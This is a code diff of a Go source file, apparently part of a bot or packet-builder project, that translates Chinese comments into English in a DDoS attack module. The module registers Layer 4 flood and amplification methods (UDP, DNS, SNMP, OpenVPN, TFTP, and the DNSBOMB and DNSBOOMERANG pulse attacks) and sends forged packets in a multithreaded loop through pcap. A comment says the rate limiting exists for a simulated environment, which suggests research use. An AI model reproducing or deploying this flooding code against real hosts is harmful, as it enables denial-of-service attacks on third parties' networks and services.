@@ -2,17 +2,18 @@ package attack
 
 import (
 	"bot/packetbuilder/protocol"
+	"context"
 	"fmt"
 	"sync"
 	"time"
-	"context"
+
 	"github.com/google/gopacket/pcap"
 )
 
-// AttackMethod 定义攻击方法签名，接受 *Layer4 作为接收器
+// AttackMethod defines the signature for attack methods, using *Layer4 as the receiver
 type AttackMethod func(l *Layer4) ([][]byte, error)
 
-// 注册攻击方法
+// Register attack methods
 var attackMethods = map[string]AttackMethod{
 	"UDP":          (*Layer4).udpPacket,
 	"DNSA":         (*Layer4).dnsaPacket,
@@ -28,17 +29,17 @@ var attackMethods = map[string]AttackMethod{
 	"SNMP":         (*Layer4).snmpPacket,
 	"OPENVPN":      (*Layer4).openvpnPacket,
 	"TFTP":         (*Layer4).tftpPacket,
-	"DNSBOMB":      (*Layer4).dnsBomb,      // 24年IEEE S&P论文提出的脉冲攻击
-	"DNSBOOMERANG": (*Layer4).dnsBoomerang, // 新提出脉冲型DDoS攻击
+	"DNSBOMB":      (*Layer4).dnsBomb,      // Pulse attack proposed in a 2024 IEEE S&P paper
+	"DNSBOOMERANG": (*Layer4).dnsBoomerang, // Newly proposed pulse-type DDoS attack
 }
 
 func (l *Layer4) StartAttack() {
-	InitBandwidthLimiter() // 初始化带宽限制
+	InitBandwidthLimiter() // Initialize bandwidth limiter
 
-	// 根据攻击方法获取攻击函数
+	// Retrieve the attack function based on the attack method
 	method, exists := attackMethods[l.Method]
 	if !exists {
-		fmt.Printf("不支持的攻击方法: %v\n", l.Method)
+		fmt.Printf("Unsupported attack method: %v\n", l.Method)
 		return
 	}
 	if l.Method == "DNSBOMB" || l.Method == "DNSBOOMERANG" {
@@ -51,22 +52,22 @@ func (l *Layer4) StartAttack() {
 		return
 	}
 
-	// 调用泛洪攻击方法，传入攻击方法
+	// Call the flood attack method, passing the attack method
 	l.floodAttack(method)
 }
 
-// 泛洪攻击通用函数
+// Generic flood attack function
 func (l *Layer4) floodAttack(packetsBuilder AttackMethod) {
 	var wg sync.WaitGroup
 
-	// 使用 AttackMethod 执行攻击方法
-	packets, err := packetsBuilder(l) // 传递 *Layer4 实例
+	// Use AttackMethod to execute the attack method
+	packets, err := packetsBuilder(l) // Pass the *Layer4 instance
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	// 启动多个线程进行攻击
+	// Launch multiple threads for the attack
 	for i := 0; i < l.ThreadCount; i++ {
 		wg.Add(1)
 		go func() {
@@ -75,34 +76,34 @@ func (l *Layer4) floodAttack(packetsBuilder AttackMethod) {
 		}()
 	}
 
-	// 等待所有线程完成
+	// Wait for all threads to complete
 	wg.Wait()
 }
 
-// 由于仿真环境计算资源有限，为了避免过度消耗资源，需要控制攻击速率
+// To avoid excessive resource consumption in a simulated environment with limited computational resources, control the attack rate
 func (l *Layer4) attack(packets [][]byte) {
-	// 获取网络接口并打开
+	// Get the network interface and open it
 	interfaceName, _, err := protocol.FindInterface(l.DstIP)
 	if err != nil {
-		fmt.Printf("没有可用的网络接口: %v\n", err)
+		fmt.Printf("No available network interface: %v\n", err)
 		return
 	}
 	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
 	if err != nil {
-		fmt.Printf("无法打开设备: %v\n", err)
+		fmt.Printf("Unable to open device: %v\n", err)
 		return
 	}
 	defer handle.Close()
 
-	// 发送伪造的攻击包
+	// Send forged attack packets
 	for {
 		select {
 		case <-STOP:
-			fmt.Println("攻击结束")
+			fmt.Println("Attack stopped")
 			return
 		default:
 			for _, packet := range packets {
-				// 在发送前等待带宽令牌
+				// Wait for bandwidth tokens before sending
 				if bandwidthLimiter != nil {
 					pktSize := len(packet)
 					if err := bandwidthLimiter.WaitN(context.Background(), pktSize); err != nil {
@@ -111,7 +112,7 @@ func (l *Layer4) attack(packets [][]byte) {
 				}
 
 				if err := handle.WritePacketData(packet); err != nil {
-					fmt.Printf("发送伪造数据包失败: %v\n", err)
+					fmt.Printf("Failed to send forged packet: %v\n", err)
 					return
 				}
 			}
